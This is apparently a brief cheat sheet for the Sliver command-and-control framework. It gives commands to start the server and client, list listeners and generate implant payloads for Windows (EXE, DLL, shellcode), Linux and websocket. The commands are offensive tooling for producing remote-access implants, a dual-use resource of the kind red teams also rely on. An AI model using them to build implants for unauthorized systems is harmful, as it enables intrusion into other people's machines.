% cat/C2
# Sliver C2
## Basic Usage
### Start Sliver Server
```
sliver server
```
### Start Sliver Client
```
sliver client
```
## Payloads
### Generate Listener
```
listeners
```
### Generate Payload (Windows EXE)
```
generate --os windows --arch amd64 --format exe --save /path/to/sliver.exe
```
### Generate Payload (Windows DLL)
```
generate --os windows --arch amd64 --format dll --save /path/to/sliver.dll
```
### Generate Payload (Windows Shellcode)
```
generate --os windows --arch amd64 --format shellcode --save /path/to/sliver.bin
```
### Generate Payload (Linux Executable)
```
generate --os linux --arch amd64 --format exe --save /path/to/sliver_linux
```
### Generate Payload (Websocket - WS)
```
generate --ws --save /path/to/sliver.ws
```
